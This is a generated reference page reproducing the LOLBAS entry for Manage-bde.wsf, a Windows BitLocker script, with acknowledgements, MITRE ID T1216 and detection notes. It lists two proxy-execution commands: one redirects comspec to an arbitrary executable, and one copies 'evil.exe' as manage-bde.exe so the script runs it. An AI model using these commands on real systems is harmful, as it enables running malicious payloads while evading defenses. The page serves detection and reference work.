---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Manage-bde.wsf

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `manage-bde.wsf` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Manage-bde.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Manage-bde.wsf](../../tools/windows/manage-bde.wsf.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | manage-bde.wsf |
| name | Manage-bde.wsf |
| type | tool |
| source | lolbas |
| url | https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@bohops'
  Person: Jimmy
- Handle: '@danielbohannon'
  Person: Daniel Bohannon
- Handle: '@JohnLaTwC'
  Person: John Lambert
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
  Description: Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.
  MitreID: T1216
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Proxy execution from script
- Category: Execute
  Command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
  Description: Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload
    file.
  MitreID: T1216
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Proxy execution from script
Created: 2018-05-25
Description: Script for managing BitLocker
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml
- IOC: Manage-bde.wsf should not be invoked by a standard user under normal situations
Full_Path:
- Path: C:\Windows\System32\manage-bde.wsf
Name: Manage-bde.wsf
Resources:
- Link: https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
- Link: https://twitter.com/bohops/status/980659399495741441
- Link: https://twitter.com/JohnLaTwC/status/1223292479270600706
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Manage-bde.yml
```

## Detection / Analysis Notes

```text
IOC: Manage-bde.wsf should not be invoked by a standard user under normal situations
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml
- IOC: Manage-bde.wsf should not be invoked by a standard user under normal situations
```
